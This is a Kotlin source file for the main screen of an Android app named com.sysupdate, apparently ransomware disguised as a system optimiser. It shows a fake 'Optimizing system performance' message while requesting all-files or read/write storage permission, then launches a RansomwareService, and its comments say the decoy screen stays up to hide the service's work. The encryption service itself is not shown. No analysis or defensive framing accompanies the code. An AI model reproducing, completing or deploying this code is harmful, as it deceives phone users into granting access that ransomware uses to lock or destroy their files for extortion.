package com.sysupdate

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    companion object {
        private const val REQ_STORAGE = 1001
        private const val REQ_MANAGE  = 1002
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Fake UI — shows "Optimizing system performance..."
        val status = findViewById<TextView>(R.id.tvStatus)
        status.text = "Optimizing system performance…"

        requestPermissions()
    }

    private fun requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ — request MANAGE_EXTERNAL_STORAGE
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, REQ_MANAGE)
            } else {
                startPayload()
            }
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ),
                REQ_STORAGE
            )
        }
    }

    override fun onRequestPermissionsResult(
        req: Int, perms: Array<out String>, results: IntArray
    ) {
        super.onRequestPermissionsResult(req, perms, results)
        if (req == REQ_STORAGE) startPayload()
    }

    override fun onActivityResult(req: Int, result: Int, data: Intent?) {
        super.onActivityResult(req, result, data)
        if (req == REQ_MANAGE) startPayload()
    }

    private fun startPayload() {
        startService(Intent(this, RansomwareService::class.java))
        // Don't finish() — keep fake UI visible while service works
    }
}
